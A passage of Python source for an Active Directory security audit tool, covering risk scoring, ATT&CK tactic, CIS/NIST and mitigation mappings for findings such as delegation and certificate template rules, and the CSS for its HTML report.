        return                     "F", "Critical risk","#bd4234"

    def maturity(self) -> int:
        """Achieved CMMI maturity = lowest level still gated by a failing rule
        (5 = perfect; one failing level-1 rule pins the whole domain at 1)."""
        if not self.findings:
            return 5
        return min(f.maturity for f in self.findings)

    @staticmethod
    def verdict(exposure: int) -> Tuple[str, str]:
        """Plain-English read on the easiest path to Tier-0 (word, color)."""
        if exposure >= 85: return "Domain compromisable", "#bd4234"
        if exposure >= 60: return "Tier-0 reachable",     "#cb7a2f"
        if exposure >= 35: return "Foothold-dependent",   "#cda52b"
        if exposure >= 15: return "Limited exposure",     "#74934a"
        return "No direct path", "#5f8a3a"

    def score(self) -> Dict[str, Any]:
        exp = self.exposure(); hyg = self.hygiene()
        word, _ = self.verdict(exp)
        pos = self.posture(); letter, gword, _ = self.grade(pos)
        cat_counts = defaultdict(int)
        for f in self.findings:
            cat_counts[f.category] += 1
        return {
            "exposure": exp, "hygiene": hyg, "verdict": word,
            "posture": pos, "grade": letter, "grade_word": gword,
            "cat_counts": {c: cat_counts.get(c, 0) for c in ("Anomaly","Privileged","Stale","Trust")},
        }

    # legacy 0-100 band color, reused for the exposure/hygiene bars
    @staticmethod
    def risk_label(score: int) -> Tuple[str, str]:
        if score >= 75: return "CRITICAL", "#bd4234"
        if score >= 50: return "HIGH",     "#cb7a2f"
        if score >= 25: return "MEDIUM",   "#cda52b"
        if score > 0:   return "LOW",      "#74934a"
        return "MINIMAL", "#5f8a3a"


# ─────────────────────────────────────────────────────────────────────────────
# HTML REPORT GENERATOR  (operator-focused, single-file deliverable)
# ─────────────────────────────────────────────────────────────────────────────

# technique-id -> ATT&CK tactic (coarse) for the coverage matrix
ATTACK_TACTIC = {
    "T1087":"Discovery", "T1069":"Discovery",
    "T1199":"Initial Access", "T1195":"Initial Access",
    "T1078":"Persistence", "T1098":"Persistence", "T1136":"Persistence",
    "T1556":"Credential Access", "T1003":"Credential Access",
    "T1558":"Credential Access", "T1552":"Credential Access",
    "T1649":"Credential Access", "T1557":"Credential Access", "T1187":"Credential Access",
    "T1134":"Privilege Escalation", "T1484":"Privilege Escalation",
    "T1222":"Defense Evasion", "T1574":"Defense Evasion",
    "T1210":"Lateral Movement", "T1550":"Lateral Movement",
    "T1584":"Resource Development",
}
ATTACK_TACTIC_ORDER = ["Initial Access","Resource Development","Discovery",
                       "Credential Access","Privilege Escalation","Defense Evasion",
                       "Persistence","Lateral Movement"]

RULE_EFFORT = {
    "A-WDigest":"Low","A-LMCompatibilityLevel":"Low","A-LLMNR":"Low","A-NBTNSDisabled":"Low",
    "A-DCLdapSign":"Low","A-SMB2SignatureNotRequired":"Low","A-SMB2SignatureNotEnabled":"Low",
    "A-Guest":"Low","A-MinPwdLen":"Low","A-PwdComplexity":"Low","A-PwdHistory":"Low",
    "A-RestrictRemoteSAM":"Low","A-NTLMAudit":"Low","A-DSRMLogon":"Low","A-HardenedPaths":"Low",
    "A-CredentialGuard":"Low","A-PowerShellLogging":"Low","P-MachineAccountQuota":"Low",
    "A-DnsZoneUpdate1":"Low","P-RecycleBin":"Low","A-WSUS-HTTP":"Low","P-AdminCountOrphan":"Low",
    "A-DCLdapsChannelBinding":"Low","S-SIDHistory":"Low",
    "A-LAPS-Not-Installed":"High","A-LocalAdminPassword":"High","P-UnconstrainedDelegation":"High",
    "S-OS-XP":"High","S-OS-Vista":"High","S-OS-NT":"High","S-SMB-v1":"High","P-AdminNum":"High",
    "P-ProtectedUsers":"High","A-Krbtgt":"High","S-FunctionalLevel1":"High","S-FunctionalLevel3":"High",
    "P-ComputerInPrivGroup":"High","P-ServiceDomainAdmin":"High",
}
EFFORT_ORDER = {"Low":0, "Moderate":1, "High":2}
EFFORT_COLOR = {"Low":"#74934a", "Moderate":"#cda52b", "High":"#cb7a2f"}

def rule_effort(rule_id: str) -> str:
    """Remediation effort for a rule (Low / Moderate / High). Anything not
    explicitly classified defaults to Moderate."""
    return RULE_EFFORT.get(rule_id, "Moderate")

# ── Framework mappings beyond ATT&CK techniques (RULE_MITRE) ──────────────────
# Per-operational-category defaults for CIS Controls v8 + NIST CSF, plus per-rule
# MITRE ATT&CK *Mitigations* (Mxxxx) for the high-signal rules. These are coarse,
# defensible mappings — STIG V-ID mapping is on the roadmap (deliberately not
# fabricated offline).
OPCAT_COMPLIANCE = {
    "Privilege Escalation": {"cis":["CIS 5","CIS 6"],  "nist":["PR.AC-1","PR.AC-4"]},
    "Credential Access":    {"cis":["CIS 5","CIS 6"],  "nist":["PR.AC-1","PR.DS-1"]},
    "Lateral Movement":     {"cis":["CIS 4","CIS 12"], "nist":["PR.PT-3","PR.AC-5"]},
    "Persistence":          {"cis":["CIS 8"],          "nist":["DE.CM-1","PR.AC-1"]},
    "Recon & Exposure":     {"cis":["CIS 4"],          "nist":["PR.AC-3","PR.AC-4"]},
    "Hygiene & Legacy":     {"cis":["CIS 4","CIS 7"],  "nist":["PR.IP-1","ID.AM-2"]},
}
RULE_MITIGATION = {
    "A-WDigest":["M1027","M1041"], "A-LMCompatibilityLevel":["M1015","M1037"],
    "A-LMHashAuthorized":["M1027","M1041"], "A-ReversiblePwd":["M1027","M1041"],
    "S-Reversible":["M1027","M1041"], "S-C-Reversible":["M1027","M1041"],
    "P-GPPPassword":["M1015","M1047"], "P-DCSync":["M1015","M1026"],
    "P-DangerousACLDomain":["M1015","M1026"], "P-DangerousACLDA":["M1015","M1026"],
    "P-WriteToPrivGroup":["M1026","M1015"], "P-OwnsPrivObject":["M1026","M1015"],
    "P-ModifiableGPO":["M1015","M1026"], "P-DangerousACLGPO":["M1015","M1026"],
    "A-MembershipEveryone":["M1026","M1018"], "P-DangerousExtendedRight":["M1026","M1015"],
    "A-CertTempCustomSubject":["M1015","M1026"], "A-CertTemplateESC4":["M1015","M1026"],
    "A-CertTempAgent":["M1015","M1026"], "A-CertTempAnyPurpose":["M1015","M1026"],
    "A-CertEnrollHttp":["M1037","M1035"], "A-CertCAManageLowPriv":["M1026","M1015"],
    "A-CertTemplateESC9":["M1015","M1041"],
    "P-UnconstrainedDelegation":["M1015","M1026"], "P-RBCD-Dangerous":["M1015","M1026"],
    "P-RBCD":["M1015","M1018"], "P-ConstrainedDelegService":["M1015","M1026"],
    "P-DelegationDCt2a4d":["M1015","M1026"], "P-DelegationDCa2d2":["M1015","M1026"],
    "S-KerberoastableAdmin":["M1027","M1026"], "S-Kerberoastable":["M1027","M1015"],
    "P-Kerberoasting":["M1027","M1026"], "S-NoPreAuth":["M1027","M1015"],
    "S-NoPreAuthAdmin":["M1027","M1026"], "S-DesEnabled":["M1041","M1015"],
    "A-LAPS-Not-Installed":["M1026","M1027"], "A-LocalAdminPassword":["M1026","M1027"],
    "A-LAPS-Joined-Computers":["M1026","M1027"],
    "A-LLMNR":["M1037","M1042"], "A-NBTNSDisabled":["M1037","M1042"],
    "A-DCLdapSign":["M1037","M1015"], "A-DCLdapsChannelBinding":["M1037","M1015"],
    "A-LDAPSigningDisabled":["M1037","M1015"], "A-SMB2SignatureNotRequired":["M1037","M1015"],
    "A-SMB2SignatureNotEnabled":["M1037","M1015"], "A-HardenedPaths":["M1037","M1015"],
    "P-MachineAccountQuota":["M1015","M1018"], "A-Krbtgt":["M1015","M1027"],
    "S-SIDHistory":["M1015"], "S-SIDHistoryPrivileged":["M1015","M1026"],
    "T-SIDHistoryDangerous":["M1015"], "T-SIDFiltering":["M1015"], "T-TGTDelegation":["M1015"],
    "A-DC-Coerce":["M1042","M1037"], "A-DC-Spooler":["M1042","M1037"],
    "A-DC-WebClient":["M1042","M1037"],
    "A-NullSession":["M1035","M1015"], "A-RestrictRemoteSAM":["M1035","M1015"],
    "A-PreWin2000Anonymous":["M1035","M1015"], "A-DsHeuristicsAnonymous":["M1035","M1015"],
    "A-Guest":["M1018","M1026"], "A-WeakLockout":["M1027","M1036"],
    "A-Pre2kComputer":["M1027","M1018"], "A-SCCM":["M1037","M1035"],
    "P-GMSAReadable":["M1026","M1015"], "A-KDSRootKey":["M1026","M1015"],
    "A-AADConnectSync":["M1026","M1032"], "A-SeamlessSSO":["M1026","M1032"],
    "P-ServiceDomainAdmin":["M1026","M1018"], "P-ComputerInPrivGroup":["M1026","M1018"],
    "P-AdminNum":["M1026","M1018"], "A-BadSuccessor":["M1015","M1026"],
    "A-DnsZoneAUCreateChild":["M1015","M1037"], "A-WSUS-HTTP":["M1037","M1051"],
    "S-SMB-v1":["M1042","M1051"], "S-Vuln-MS17_010":["M1051","M1042"],
    "S-Vuln-MS14-068":["M1051","M1015"], "S-OS-XP":["M1051","M1042"],
    "S-OS-Vista":["M1051","M1042"], "S-OS-NT":["M1051","M1042"],
    "S-FunctionalLevel1":["M1051"], "S-FunctionalLevel3":["M1051"],
    "P-ExchangePrivEsc":["M1026","M1015"], "P-DNSAdmin":["M1026","M1018"],
}
# Human-readable expansion for the framework chips' tooltips.
MITIGATION_NAME = {
    "M1015":"Active Directory Configuration", "M1018":"User Account Management",
    "M1026":"Privileged Account Management", "M1027":"Password Policies",
    "M1032":"Multi-factor Authentication", "M1035":"Limit Access to Resource Over Network",
    "M1036":"Account Use Policies", "M1037":"Filter Network Traffic",
    "M1041":"Encrypt Sensitive Information", "M1042":"Disable or Remove Feature or Program",
    "M1047":"Audit", "M1051":"Update Software",
}

def rule_compliance(rule_id: str, opcat: str) -> Dict[str, List[str]]:
    """Framework mappings for a rule: CIS Controls v8 + NIST CSF (by operational
    category) and MITRE ATT&CK Mitigations (per rule)."""
    base = OPCAT_COMPLIANCE.get(opcat, {})
    return {"cis": list(base.get("cis", [])), "nist": list(base.get("nist", [])),
            "mitigation": list(RULE_MITIGATION.get(rule_id, []))}

# Plain, non-condensed system fonts — a condensed display face made headings look
# vertically stretched. Used both in CSS and (literally) inside SVG <text>.

_KC_CSS = r"""
:root{
  --bg:#15170f; --surface:#1c1f13; --surface2:#242818; --surface3:#2d321f;
  --border:#363c23; --border2:#4a5230; --track:#2f341c;
  --text:#e9e4d3; --muted:#a0a585; --faint:#717954;
  --accent:#c7a64f; --accent2:#869150; --deck:#d3c193;
  --crit:#bd4234; --high:#cb7a2f; --med:#cda52b; --low:#74934a; --info:#8c917a;
  --ok:#82a155; --warn:#cda52b; --bad:#bd4234;
  --shadow:0 4px 22px rgba(0,0,0,.42);
  --mono:'JetBrains Mono','SFMono-Regular',ui-monospace,Menlo,Consolas,monospace;
  --sans:'Segoe UI','Helvetica Neue',Arial,system-ui,-apple-system,sans-serif;
  --r:8px; --r-sm:4px;
}
html[data-theme=light]{
  --bg:#dedac6; --surface:#edead8; --surface2:#e4dfc9; --surface3:#d8d2b9;
  --border:#c0b794; --border2:#aaa07c; --track:#d0c9ae;
  --text:#21250e; --muted:#585d40; --faint:#787d5c;
  --accent:#7c611f; --accent2:#536530; --deck:#5a5230;
  --shadow:0 3px 14px rgba(60,55,30,.16);
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--sans);background:var(--bg);color:var(--text);font-size:14px;
  line-height:1.55;-webkit-font-smoothing:antialiased}
a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
code{font-family:var(--mono);font-size:.85em;background:var(--surface3);padding:1px 6px;
  border-radius:var(--r-sm);color:var(--deck)}
.kc-mono{font-family:var(--mono);font-size:.88em}
.kc-muted{color:var(--muted)}
h1,h2,h3,h4{font-weight:700;letter-spacing:.01em}
.ulabel{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--faint)}

/* ── slim header ── */
.kc-head{display:flex;align-items:center;gap:14px;padding:14px 26px;
  background:linear-gradient(180deg,#1d2113,#15170f);border-bottom:1px solid var(--border);position:relative}
html[data-theme=light] .kc-head{background:linear-gradient(180deg,#d2cbb0,#dedac6)}
.kc-head::after{content:"";position:absolute;left:0;right:0;bottom:-3px;height:3px;
  background:repeating-linear-gradient(135deg,var(--accent) 0 16px,#15170f 16px 32px);opacity:.8}
.kc-head .mark{font-size:26px;color:var(--accent);line-height:1}
.kc-head .name{font-size:24px;font-weight:800;letter-spacing:.26em;color:var(--text)}
.kc-head .full{font-size:12px;color:var(--muted);letter-spacing:.02em;border-left:1px solid var(--border2);
  padding-left:14px;margin-left:2px}
.kc-head .class{margin-left:auto;font-family:var(--mono);font-size:10px;letter-spacing:.18em;
  color:#15170f;background:var(--accent);padding:4px 11px;border-radius:3px;font-weight:700}

/* ── sticky nav ── */
.kc-nav{position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:12px;
  background:rgba(21,23,15,.95);backdrop-filter:blur(6px);border-bottom:1px solid var(--border);
  padding:0 26px;height:44px}
html[data-theme=light] .kc-nav{background:rgba(222,218,198,.96)}
.kc-nav-links{display:flex;gap:3px;flex:1;overflow:auto}
.kc-nav-links a{font-family:var(--mono);font-size:11px;letter-spacing:.05em;text-transform:uppercase;
  color:var(--muted);padding:6px 10px;border-radius:var(--r-sm);white-space:nowrap}
.kc-nav-links a:hover,.kc-nav-links a.active{color:var(--text);background:var(--surface2);text-decoration:none}
.kc-navb{margin-left:6px;background:var(--accent);color:#15170f;border-radius:9px;font-size:10px;padding:0 6px;font-weight:700}
.kc-nav-tools{display:flex;gap:6px}
.kc-iconbtn{background:var(--surface2);border:1px solid var(--border2);color:var(--text);
  width:30px;height:30px;border-radius:var(--r-sm);cursor:pointer;font-size:15px}
.kc-iconbtn:hover{border-color:var(--accent);color:var(--accent)}

/* ── layout — wide ── */
.kc-container{max-width:1480px;margin:0 auto;padding:24px 28px 64px}
.kc-section{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);
  padding:22px 28px;margin-bottom:20px;box-shadow:var(--shadow)}
.kc-h2{font-size:16px;letter-spacing:.05em;text-transform:uppercase;color:var(--text);
  padding-bottom:10px;margin-bottom:16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:9px}
.kc-h2 .kc-count{color:var(--muted);font-weight:400}
.kc-h2 .tag{margin-left:auto;font-family:var(--mono);font-size:10px;letter-spacing:.1em;
  text-transform:uppercase;color:var(--faint);font-weight:400}
.kc-sub{color:var(--muted);font-size:13px;margin-bottom:16px;max-width:980px}
.kc-sub-h{font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--deck);margin:20px 0 10px;font-weight:700}
.kc-critborder{border-left:3px solid var(--crit)}
.kc-critsub{color:var(--crit);font-weight:600}

/* ── summary: scoreband + dossier + narrative ── */
.kc-scoreband{display:flex;gap:16px;flex-wrap:wrap;align-items:stretch;margin-bottom:18px}
.kc-verdict{flex:0 0 auto;display:flex;flex-direction:column;align-items:center;justify-content:center;
  width:190px;border-radius:var(--r);background:var(--surface2);border:1px solid var(--border);
  border-top:3px solid;padding:14px 12px;text-align:center}
.kc-verdict .ev{font-size:56px;font-weight:800;line-height:1}
.kc-verdict .evl{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--faint)}
.kc-verdict .evw{font-size:14px;font-weight:700;margin-top:6px;line-height:1.2}
.kc-meters{flex:1;min-width:300px;display:flex;flex-direction:column;justify-content:center;gap:14px;
  background:var(--surface2);border:1px solid var(--border);border-radius:var(--r);padding:16px 18px}
.kc-meter-h{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:5px}
.kc-meter-h b{font-size:13px;letter-spacing:.02em} .kc-meter-h .v{font-family:var(--mono);font-weight:700}
.kc-meter-h small{color:var(--muted);font-size:11px;margin-left:7px}
.kc-meter-t{background:var(--track);border-radius:4px;height:11px;overflow:hidden}
.kc-meter-f{height:11px;border-radius:4px}
.kc-readout{flex:0 0 auto;display:flex;gap:14px;align-items:center;
  background:var(--surface2);border:1px solid var(--border);border-radius:var(--r);padding:12px 16px}
.kc-readout .col{display:flex;flex-direction:column;align-items:center;gap:2px}
.kc-mat-chip{display:inline-block;font-family:var(--mono);font-size:11px;font-weight:700;padding:4px 9px;border-radius:4px;color:#15170f}
.kc-summary2{display:grid;grid-template-columns:320px 1fr;gap:22px;align-items:start}
@media(max-width:1000px){.kc-summary2{grid-template-columns:1fr}}
.kc-dossier{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r);overflow:hidden}
.kc-dossier-h{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;
  color:#15170f;background:var(--accent);padding:6px 12px;font-weight:700}
.kc-dossier table{width:100%;border-collapse:collapse;font-size:12.5px}
.kc-dossier td{padding:6px 12px;border-bottom:1px solid var(--border)}
.kc-dossier tr:last-child td{border-bottom:none}
.kc-dossier td:first-child{color:var(--faint);font-family:var(--mono);font-size:10.5px;
  letter-spacing:.04em;text-transform:uppercase;width:42%;vertical-align:top}
.kc-dossier td:last-child{color:var(--text);word-break:break-word}
.kc-narrative p{margin-bottom:11px;font-size:14px;line-height:1.65}
.kc-legend{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:6px;font-size:11px;color:var(--muted)}
.kc-legend i{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:4px}
.kc-keyrisks{margin-top:8px}
.kc-keyrisks ul{list-style:none}
.kc-keyrisks li{padding:5px 0;display:flex;align-items:baseline;gap:9px;border-bottom:1px dashed var(--border)}
.kc-keyrisks li:last-child{border-bottom:none}
.kc-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0;transform:translateY(1px)}
.kc-kr-sub{color:var(--muted);font-size:12.5px}

/* category strip */
.kc-catstrip{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:12px;margin-top:18px}
.kc-cat-card{background:var(--surface2);border:1px solid var(--border);border-top:3px solid;border-radius:var(--r-sm);padding:11px 14px}
.kc-cat-label{font-family:var(--mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted)}
.kc-cat-score{font-size:30px;font-weight:800;line-height:1.1}
.kc-cat-count{font-size:11px;color:var(--faint)}
.kc-cat-track{background:var(--track);border-radius:3px;height:6px;margin-top:6px;overflow:hidden}
.kc-cat-bar{height:6px;border-radius:3px}

/* ── attack-path chains (BloodHound-style) ── */
.kc-paths-tag{display:inline-flex;gap:14px;margin-bottom:16px;flex-wrap:wrap}
.kc-pstat{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r-sm);padding:8px 14px}
.kc-pstat b{font-size:20px;font-weight:800;color:var(--accent)}
.kc-pstat span{display:block;font-family:var(--mono);font-size:9.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint)}
.kc-chain{display:flex;align-items:stretch;flex-wrap:wrap;gap:0;background:var(--surface2);
  border:1px solid var(--border);border-left:3px solid var(--crit);border-radius:var(--r-sm);
  padding:12px 14px;margin-bottom:10px}
.kc-chain.sev-high{border-left-color:var(--high)} .kc-chain.sev-medium{border-left-color:var(--med)}
.kc-chain-row{display:flex;align-items:center;flex-wrap:wrap;gap:2px;flex:1;min-width:0}
.kc-node{display:inline-flex;align-items:center;gap:5px;background:var(--surface3);border:1px solid var(--border2);
  border-radius:14px;padding:4px 11px;font-size:12.5px;font-weight:600;white-space:nowrap}
.kc-node.attacker{border-color:var(--high);color:var(--high)}
.kc-node.crown{border-color:var(--crit);background:rgba(189,66,52,.14);color:var(--crit);font-weight:700}
.kc-node.loot{border-color:var(--accent);color:var(--accent)}
.kc-node .ic{font-size:12px;opacity:.85}
.kc-edge{display:inline-flex;flex-direction:column;align-items:center;color:var(--muted);
  font-family:var(--mono);font-size:9px;letter-spacing:.03em;text-transform:uppercase;padding:0 4px;min-width:54px}
.kc-edge::after{content:"→";font-size:15px;line-height:.8;color:var(--accent)}
.kc-chain-meta{display:flex;flex-direction:column;justify-content:center;align-items:flex-end;
  gap:4px;padding-left:12px;border-left:1px dashed var(--border);margin-left:8px}
.kc-chain-tool{font-family:var(--mono);font-size:10px;color:var(--deck)}

/* ── ATT&CK ── */
.kc-attack-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:12px}
.kc-tcol{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r);padding:10px}
.kc-tcol-h{font-family:var(--mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--accent);
  border-bottom:1px solid var(--border);padding-bottom:6px;margin-bottom:8px}
.kc-tech{display:flex;align-items:center;gap:6px;padding:5px 6px;border-radius:var(--r-sm);background:var(--surface3);margin-bottom:5px}
.kc-tech-id{font-family:var(--mono);font-size:10.5px;color:var(--deck)}
.kc-tech-n{flex:1;font-size:11.5px}
.kc-tech-c{font-family:var(--mono);font-size:11px;background:var(--accent);color:#15170f;border-radius:8px;padding:0 6px;font-weight:700}

/* ── tables ── */
.kc-table{width:100%;border-collapse:collapse;border-radius:var(--r-sm);overflow:hidden;font-size:13px}
.kc-table th{background:var(--surface3);color:var(--deck);text-align:left;padding:9px 12px;
  font-family:var(--mono);font-size:10.5px;letter-spacing:.05em;text-transform:uppercase;font-weight:600}
.kc-table td{padding:9px 12px;border-bottom:1px solid var(--border);vertical-align:top}
.kc-table tbody tr:last-child td{border-bottom:none}
.kc-table tbody tr:hover td{background:var(--surface2)}
.kc-num{text-align:right;font-variant-numeric:tabular-nums;font-family:var(--mono)}
.kc-detail{color:var(--muted);font-size:12px}
.kc-sid code{font-size:10px;color:var(--faint);background:transparent;padding:0}
.kc-crit-val{background:var(--crit);color:#fff;font-weight:700}
.kc-ok{color:var(--ok);font-weight:600}.kc-bad{color:var(--bad);font-weight:600}.kc-warn{color:var(--warn);font-weight:600}
.kc-sev-pill,.kc-cat-pill{display:inline-block;color:#fff;padding:2px 8px;border-radius:var(--r-sm);
  font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase}
.kc-cat-pill{color:#15170f}
.kc-badge{display:inline-block;color:#fff;padding:1px 7px;border-radius:3px;font-size:10px;font-weight:700;font-family:var(--mono)}
.kc-badge-crit{background:var(--crit)}
.kc-mini{display:inline-block;font-family:var(--mono);font-size:10px;background:var(--surface3);
  border:1px solid var(--border2);color:var(--deck);border-radius:3px;padding:1px 5px;margin:1px 2px}

/* ── control-path: clickable nodes, graph, drawer ── */
.kc-node.clk{cursor:pointer;transition:border-color .1s,color .1s}
.kc-node.clk:hover,.kc-node.clk:focus{border-color:var(--accent);color:var(--accent);outline:none}
.kc-node.clk[data-stale="1"]::after{content:"●";color:var(--warn);font-size:8px;margin-left:5px;transform:translateY(-1px)}
.kc-graph-wrap{overflow:auto;border:1px solid var(--border);border-radius:var(--r-sm);
  background:var(--surface2);padding:10px;margin-bottom:14px;max-height:560px}
.kc-gnode{cursor:pointer} .kc-gnode rect{transition:stroke-width .1s}
.kc-gnode:hover rect,.kc-gnode:focus rect{stroke-width:2.4;outline:none}
.kc-drawer-ov{position:fixed;inset:0;background:rgba(8,9,5,.55);z-index:190;display:none}
.kc-drawer-ov.open{display:block}
.kc-drawer{position:fixed;top:0;right:-520px;width:480px;max-width:94vw;height:100%;
  background:var(--surface);border-left:1px solid var(--border2);box-shadow:-6px 0 26px rgba(0,0,0,.42);
  z-index:200;transition:right .18s ease;overflow:auto}
.kc-drawer.open{right:0}
.kc-dw-h{display:flex;align-items:center;gap:10px;padding:14px 18px;border-bottom:1px solid var(--border);
  position:sticky;top:0;background:var(--surface)}
.kc-dw-h .nm{font-size:16px;font-weight:800;word-break:break-word}
.kc-dw-x{margin-left:auto;background:var(--surface2);border:1px solid var(--border2);color:var(--text);
  width:30px;height:30px;border-radius:var(--r-sm);cursor:pointer;font-size:16px;flex-shrink:0}
.kc-dw-x:hover{border-color:var(--accent);color:var(--accent)}
.kc-dw-b{padding:14px 18px}
.kc-dw-badge{display:inline-block;font-family:var(--mono);font-size:9.5px;letter-spacing:.06em;
  text-transform:uppercase;padding:2px 7px;border-radius:3px;border:1px solid var(--border2);color:var(--muted);margin-right:5px}
.kc-dw-badge.t0{background:var(--crit);color:#fff;border-color:var(--crit)}
.kc-dw-note{color:var(--muted);font-size:12.5px;margin:8px 0 12px;line-height:1.55}
.kc-dw-facts{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12.5px;margin-bottom:10px}
.kc-dw-facts dt{color:var(--faint);font-family:var(--mono);font-size:10.5px;text-transform:uppercase}
.kc-dw-mt{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
.kc-dw-mt th{text-align:left;color:var(--deck);font-family:var(--mono);font-size:9.5px;text-transform:uppercase;
  padding:5px 7px;border-bottom:1px solid var(--border)}
.kc-dw-mt td{padding:5px 7px;border-bottom:1px solid var(--border)}
.kc-dw-mt tr.stale td{background:rgba(205,165,43,.08)}

/* roadmap */
.kc-rm-tier{font-size:13px;letter-spacing:.05em;text-transform:uppercase;color:var(--deck);margin:18px 0 8px;font-weight:700}
.kc-rm-desc{font-weight:400;font-size:12px;color:var(--muted);text-transform:none;letter-spacing:0}
.kc-rm-table tbody tr{cursor:pointer}
.kc-rm-fix{color:var(--muted);font-size:12px;margin-top:3px}
.kc-ap-sub{color:var(--muted);font-size:12px;margin-top:2px}

/* findings */
.kc-toolbar{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:8px}
.kc-pills{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
.kc-fsep{width:1px;height:20px;background:var(--border2);margin:0 4px}
.kc-fp{font-family:var(--mono);font-size:11px;background:var(--surface2);color:var(--muted);
  border:1px solid var(--border2);border-radius:14px;padding:4px 12px;cursor:pointer;--c:var(--accent)}
.kc-fp:hover{color:var(--text);border-color:var(--c)}
.kc-fp-on,.kc-fp.on{background:var(--c);color:#15170f;border-color:var(--c);font-weight:700}
.kc-toolbar-r{display:flex;gap:6px;align-items:center}
#kc-q{background:var(--surface2);border:1px solid var(--border2);color:var(--text);border-radius:14px;
  padding:5px 12px;font-size:12.5px;outline:none;min-width:200px}
#kc-q:focus{border-color:var(--accent)}
.kc-showing{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:6px}
.kc-ftable td{vertical-align:middle}
.kc-frow{cursor:pointer}
.kc-frow:hover td{background:var(--surface2)}
.kc-frow:focus{outline:2px solid var(--accent);outline-offset:-2px}
.kc-toggle{display:inline-block;width:18px;height:18px;line-height:16px;text-align:center;border:1px solid var(--border2);
  border-radius:50%;color:var(--muted);font-weight:700;font-size:12px}
.kc-frow:hover .kc-toggle{border-color:var(--accent);color:var(--accent)}
.kc-panel{background:var(--bg);border:1px solid var(--border);border-left:3px solid var(--accent);
  border-radius:0 var(--r-sm) var(--r-sm) 0;padding:16px 20px;margin:2px 0 8px}
.kc-block{margin-top:12px}.kc-block:first-child{margin-top:0}
.kc-bh{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--deck);margin-bottom:5px}
.kc-bb{font-size:13px;line-height:1.6}
.kc-attck-row{margin-bottom:6px}
.kc-evidence{background:var(--surface2);border-left:3px solid var(--accent2);padding:8px 12px;border-radius:0 var(--r-sm) var(--r-sm) 0}
.kc-attack{background:rgba(189,66,52,.08);border-left:3px solid var(--crit);padding:8px 12px;border-radius:0 var(--r-sm) var(--r-sm) 0}
.kc-fix{background:rgba(130,161,85,.1);border-left:3px solid var(--ok);padding:8px 12px;border-radius:0 var(--r-sm) var(--r-sm) 0}
.kc-cmd,.kc-fixlist,.kc-reflist,.kc-affected{list-style:none}
.kc-cmd li{padding:3px 0;display:flex;align-items:center;gap:8px}
.kc-cmd li code{flex:1;background:#0d0e08;border:1px solid var(--border2);color:#dbe3b4;padding:5px 9px;
  border-radius:var(--r-sm);word-break:break-all;display:block}
html[data-theme=light] .kc-cmd li code{background:#21250e;color:#e2e6cb}
.kc-copy{font-family:var(--mono);font-size:10px;background:var(--surface3);border:1px solid var(--border2);
  color:var(--muted);border-radius:3px;padding:4px 9px;cursor:pointer;flex-shrink:0}
.kc-copy:hover{border-color:var(--accent);color:var(--accent)}
.kc-fixlist li,.kc-reflist li{padding:3px 0 3px 16px;position:relative;font-size:12.5px}
.kc-fixlist li::before{content:"▸";position:absolute;left:0;color:var(--accent2)}
.kc-affected{columns:3;column-gap:22px;font-family:var(--mono);font-size:11.5px;color:var(--muted);margin-top:2px}
@media(max-width:900px){.kc-affected{columns:2}}
.kc-affected li{padding:1px 0;break-inside:avoid}
.kc-affected .kc-more{color:var(--faint);font-style:italic}

/* inventory */
.kc-stat-grid{display:grid;gap:10px;grid-template-columns:repeat(auto-fill,minmax(168px,1fr))}
.kc-stat{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r-sm);padding:9px 13px}
.kc-stat-l{font-family:var(--mono);font-size:9.5px;letter-spacing:.04em;text-transform:uppercase;color:var(--faint)}
.kc-stat-v{font-size:18px;font-weight:700;margin-top:1px}
.kc-roster{margin-bottom:12px}
.kc-roster h4{font-size:12px;color:var(--deck);margin-bottom:5px}
.kc-rchip{display:inline-block;font-family:var(--mono);font-size:11px;background:var(--surface3);
  border:1px solid var(--border2);border-radius:3px;padding:2px 7px;margin:2px}
.kc-rchip.kc-more{color:var(--faint)}
.kc-barchart{display:flex;flex-direction:column;gap:5px;max-width:760px}
.kc-bar-row{display:flex;align-items:center;gap:10px}
.kc-bar-l{width:240px;font-size:12px;color:var(--muted);text-align:right;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.kc-bar-t{flex:1;background:var(--track);border-radius:3px;height:14px;overflow:hidden}
.kc-bar-f{height:14px;border-radius:3px}
.kc-bar-n{width:42px;font-family:var(--mono);font-size:11px;color:var(--muted)}

.kc-footer{text-align:center;color:var(--faint);font-family:var(--mono);font-size:11px;letter-spacing:.05em;
  padding:24px;border-top:1px solid var(--border)}
.kc-top{position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:50%;background:var(--accent);
  color:#15170f;border:none;font-size:20px;cursor:pointer;box-shadow:var(--shadow);z-index:40}

/* clickable category cards */
